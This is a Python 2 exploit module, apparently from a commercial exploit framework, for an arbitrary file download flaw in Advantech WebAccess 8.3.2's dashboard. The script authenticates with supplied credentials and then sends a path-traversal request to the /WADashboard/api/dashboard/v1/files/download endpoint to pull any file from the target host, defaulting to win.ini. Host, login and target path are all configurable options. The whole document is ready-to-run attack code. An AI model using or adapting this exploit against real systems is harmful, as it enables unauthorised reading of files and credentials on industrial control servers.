from Sploit import Sploit
from collections import OrderedDict
import urllib
import urllib2
from base64 import b64decode
import cookielib

INFO = {}
INFO['NAME'] = "efa_advantech_webaccess_3_8_2_dashboardconfig_afd"
INFO['DESCRIPTION'] = "Advantech WebAccess Node 8.3.2 Arbitrary File Download"
INFO['VENDOR'] = "http://www.advantech.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """This flaw exists in /WADashboard/api/dashboard/v1/files/download API method.
Lack of input sanitization of parameters "project" and "folderNameFileName" allows attacker to retrieve arbitrary files.
Authentication is required to exploit this vulnerability.
Tested against Advantech WebAccess 8.3.2 on Windows 7 x64 SP1 
"""
INFO['DOWNLOAD_LINK'] = "http://support.advantech.com/support/DownloadSRDetail_New.aspx?SR_ID=1-MS9MJV&Doc_Source=Download"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = "11 Oct 2018, Gleg team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.57", dict(description="Target host")
OPTIONS["SSL"] = False, dict(description="Use HTTPS")
OPTIONS["TARGET_PATH"] = "/Windows/win.ini", dict(description="Path to target file")
OPTIONS["LOGIN"] = "user", dict(description="Dashboard login")
OPTIONS["PASSWORD"] = "user", dict(description="Dashboard password")

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.dashboard_port = 8081
        self.login = "Admin"
        self.password = ""
        self.ssl = False
        self.protocol = 'http'
        self.target_path = '/Windows/win.ini'

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.ssl = self.args.get("SSL", self.ssl)
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)
        self.target_path = self.args.get("TARGET_PATH", self.target_path)

        self.protocol = 'https' if self.ssl else 'http'
        x = 0
        if ':' in self.target_path:
            x = self.target_path.index(':') + 1
        self.target_path = self.target_path[x:].strip('\\/')
        self.target_path = self.target_path.replace('\\', '/')


        # add cookie jar to handle cookies
        urllib2.install_opener(
            urllib2.build_opener(
                urllib2.HTTPCookieProcessor(
                    cookielib.CookieJar()
                )
            )
        )


    def authorize(self):
        url = "{}://{}:{}/WADashboard/login?cont=dashboardViewer".format(self.protocol, self.host, self.dashboard_port)
        data = {
            "projectName1": "1",  # could be any but not empty
            "username": "%s" % self.login,
            "password": "%s" % self.password,
            "recId": ""
        }
        data = urllib.urlencode(data)
        req = urllib2.Request(url=url, data=data)
        try:
            r = urllib2.urlopen(req)
            if not r.getcode() == 200:
                self.log("[-] Failed to authorize. Check your login/password or try another")
                self.finish(False)
            self.log("[+] Successfully authorized")
        except Exception as ex:
            self.log("[-] Authorization failed: failed to send request\r\n%s" % ex)
            self.finish(False)

    def download_file(self):
        x = self.target_path.rfind('/') + 1
        url = "{}://{}:{}/WADashboard/api/dashboard/v1/files/download?project=../../../../../../{}&folderNameFileName=../!{}&base64OrImage=base64".format(
            self.protocol,
            self.host,
            self.dashboard_port,
            self.target_path[0:x],
            self.target_path[x:]
        )
        try:
            r = urllib2.urlopen(url)
            r = r.read()
            if not 'errno' in r:
                self.log('[+] File {} content:\r\n{}'.format(self.target_path[x:], b64decode(r)))
            else:
                self.log('[*] Seems like this file is either locked by a process or doesn\'t exist')
            self.finish(True)
        except Exception as ex:
            self.log('[-] Request failed\r\n%s' % ex)
            self.finish(False)

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.log('[INFO] Port 8081 is used by default to access Dashboard. You may have to change it in order for this exploit to work.')
        self.authorize()
        self.download_file()

if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()